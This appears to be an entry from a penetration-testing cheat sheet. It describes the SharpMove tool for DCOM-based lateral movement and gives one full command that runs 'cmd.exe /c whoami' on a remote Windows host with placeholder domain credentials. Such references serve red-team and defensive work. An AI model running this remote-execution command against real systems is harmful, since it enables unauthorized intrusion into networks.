---
description: |
  SharpMove is a .NET tool by 0xthirteen for authenticated remote code execution that, alongside WMI, Task Scheduler, RDP, and SCM, supports lateral movement over DCOM. Where Impacket's dcomexec.py is run from Linux, SharpMove is built for operators working from a Windows box or through a C2's execute-assembly, and it exposes additional DCOM launch objects such as ShellBrowserWindow.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  SharpMove.exe action=dcom computername=10.10.10.1 command="cmd.exe /c whoami" method=ShellBrowserWindow username=test.local\john password=password123
items:
  - Password
  - Username
services:
  - DCOM
OS:
  - Windows
phases:
  - Exploitation
references:
  - https://github.com/0xthirteen/SharpMove
  - https://pentestlab.blog/tag/sharpmove/
---
